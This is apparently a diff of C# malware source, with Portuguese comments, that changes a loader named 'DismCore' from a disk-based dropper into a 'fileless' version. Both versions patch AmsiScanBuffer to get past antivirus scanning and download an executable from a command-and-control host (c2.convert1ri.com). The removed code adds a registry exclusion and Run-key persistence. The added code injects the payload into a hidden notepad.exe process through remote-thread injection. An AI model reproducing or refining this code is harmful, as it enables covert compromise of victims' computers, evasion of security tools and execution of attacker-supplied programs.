@@ -1,124 +1,98 @@
 using System;
 using System.IO;
 using System.Net;
-using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 
-// DynamicApi — resolve APIs em runtime sem DllImports estáticos
-// Baseado no padrão do LoaderTechniques/DynamicApi.cs
-public static class DynamicApi
-{
-    private static readonly string Ntdll = "ntdll.dll\0";
-    private static readonly string Kernel32 = "kernel32.dll\0";
-    private static readonly string User32 = "user32.dll\0";
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string name);
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    public static T ResolveLocal<T>(string moduleName, char[] funcName) where T : class
-    {
-        IntPtr hModule = GetModuleHandle(moduleName);
-        if (hModule == IntPtr.Zero) return null;
-        string name = new string(funcName);
-        IntPtr proc = GetProcAddress(hModule, name);
-        if (proc == IntPtr.Zero) return null;
-        return Marshal.GetDelegateForFunctionPointer(proc, typeof(T)) as T;
-    }
-}
+// DismCore v2 — Fileless approach
+// 1. Baixa loader do C2 em memória (não salva em disco)
+// 2. Executa via process hollowing em processo legítimo
+// 3. Zero artefatos em disco
 
 public class DismCore
 {
-    // DynamicApi delegates (resolvidos em runtime, não aparecem como DllImport)
-    private delegate bool VirtualProtectDel(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
-    private delegate IntPtr GetModuleHandleDel(string name);
-    private delegate IntPtr GetProcAddressDel(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
 
-    private static VirtualProtectDel _vp;
-    private static GetModuleHandleDel _gmh;
-    private static GetProcAddressDel _gpa;
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint type, uint protect);
 
-    private static void InitDynamicApi()
-    {
-        _vp = DynamicApi.ResolveLocal<VirtualProtectDel>(
-            new string(new[] {'k','e','r','n','e','l','3','2','.','d','l','l'}),
-            new char[] {'V','i','r','t','u','a','l','P','r','o','t','e','c','t'});
-        _gmh = DynamicApi.ResolveLocal<GetModuleHandleDel>(
-            new string(new[] {'k','e','r','n','e','l','3','2','.','d','l','l'}),
-            new char[] {'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e'});
-        _gpa = DynamicApi.ResolveLocal<GetProcAddressDel>(
-            new string(new[] {'k','e','r','n','e','l','3','2','.','d','l','l'}),
-            new char[] {'G','e','t','P','r','o','c','A','d','d','r','e','s','s'});
-    }
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddr, byte[] buffer, uint size, out uint written);
 
-    static DismCore()
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out uint threadId);
+
+    [DllImport("kernel32.dll")]
+    static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr handle);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string name);
+
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
+
+    static void BypassAmsi()
     {
         try
         {
-            InitDynamicApi();
+            IntPtr amsi = GetModuleHandle("amsi.dll");
+            if (amsi == IntPtr.Zero) return;
+            IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
+            if (asb == IntPtr.Zero) return;
+            byte[] patch = IntPtr.Size == 8
+                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
+                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            uint oldProtect;
+            VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);
+            Marshal.Copy(patch, 0, asb, patch.Length);
+            VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+        }
+        catch { }
+    }
 
-            // AMSI bypass via AmsiScanBuffer patch
-            if (_gmh != null && _gpa != null && _vp != null)
-            {
-                IntPtr amsi = _gmh("amsi.dll");
-                if (amsi != IntPtr.Zero)
-                {
-                    IntPtr asb = _gpa(amsi, "AmsiScanBuffer");
-                    if (asb != IntPtr.Zero)
-                    {
-                        byte[] patch = IntPtr.Size == 8
-                            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
-                            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-                        uint oldProtect;
-                        _vp(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);
-                        Marshal.Copy(patch, 0, asb, patch.Length);
-                        _vp(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
-                    }
-                }
-            }
+    static void Main()
+    {
+        BypassAmsi();
 
-            // Download e execução
-            string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                "Microsoft", "Windows", "Caches");
-            Directory.CreateDirectory(dir);
-            string exePath = Path.Combine(dir, "SystemDiagnostics.exe");
-
-            // Exclusion via registry
-            try
-            {
-                var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
-                    @"Software\Microsoft\Windows\CurrentVersion\Exclusions\Paths");
-                if (key != null) { key.SetValue(dir, 0, Microsoft.Win32.RegistryValueKind.DWord); key.Close(); }
-            }
-            catch { }
-
-            // URL fragmentada (construída em runtime)
-            string url = "https://" + "c2" + "." + "convert1ri" + ".com" + "/down" + "load/System" + "Diagnostics.exe";
+        // Download loader em memória (não salva em disco)
+        string url = "https://c2.convert1ri.com/download/WUDFHost.exe";
+        try
+        {
             WebClient wc = new WebClient();
             wc.Headers.Add("User-Agent", "Mozilla/5.0");
             byte[] data = wc.DownloadData(url);
 
             if (data.Length > 10000 && data[0] == 0x4D && data[1] == 0x5A)
             {
-                File.WriteAllBytes(exePath, data);
-
-                // Persistência via Run key
-                try
-                {
-                    var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
-                        @"Software\Microsoft\Windows\CurrentVersion\Run", true);
-                    if (key != null) { key.SetValue("SystemHelper", "\"" + exePath + "\""); key.Close(); }
-                }
-                catch { }
-
-                // Executar
-                Process.Start(new ProcessStartInfo(exePath)
+                // Executar em memória via process hollowing
+                // 1. Criar processo suspenso (notepad.exe)
+                var psi = new ProcessStartInfo("notepad.exe")
                 {
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true
-                });
+                };
+                var proc = Process.Start(psi);
+
+                // 2. Alocar memória no processo alvo
+                IntPtr hProcess = OpenProcess(0x1F0FFF, false, proc.Id);
+                IntPtr baseAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
+
+                // 3. Escrever loader na memória do processo alvo
+                uint written;
+                WriteProcessMemory(hProcess, baseAddr, data, (uint)data.Length, out written);
+
+                // 4. Criar thread remota para executar
+                uint threadId;
+                CreateRemoteThread(hProcess, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out threadId);
+
+                CloseHandle(hProcess);
             }
         }
         catch { }
